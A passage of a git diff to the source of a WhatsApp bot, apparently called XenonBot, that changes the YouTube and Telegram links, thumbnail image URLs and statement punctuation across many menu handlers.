-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -23534,9 +23055,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'funmenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -23712,7 +23232,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -23738,7 +23258,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -23771,11 +23291,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -23833,11 +23353,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -23918,11 +23438,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -23962,9 +23482,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickermenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -24083,7 +23602,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -24109,7 +23628,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -24142,11 +23661,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -24204,11 +23723,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -24289,11 +23808,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -24333,9 +23852,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animemenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -24582,7 +24100,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -24608,7 +24126,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -24641,11 +24159,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -24703,11 +24221,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -24788,11 +24306,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -24832,9 +24350,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'nsfwmenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -24960,7 +24477,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -24986,7 +24503,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -25019,11 +24536,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -25081,11 +24598,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -25166,11 +24683,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -25210,9 +24727,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'databasemenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -25332,7 +24848,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -25358,7 +24874,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -25391,11 +24907,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -25453,11 +24969,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -25538,11 +25054,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -25582,9 +25098,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'storemenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -25701,7 +25216,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -25727,7 +25242,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -25760,11 +25275,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -25822,11 +25337,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -25907,11 +25422,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -25951,9 +25466,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'religionmenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -26068,7 +25582,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -26094,7 +25608,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -26127,11 +25641,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -26189,11 +25703,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -26274,11 +25788,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -26318,9 +25832,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'bugmenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -26441,7 +25954,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -26467,7 +25980,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -26500,11 +26013,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -26562,11 +26075,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -26647,11 +26160,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -26691,9 +26204,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'othermenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -26821,7 +26333,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -26847,7 +26359,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -26880,11 +26392,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -26942,11 +26454,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
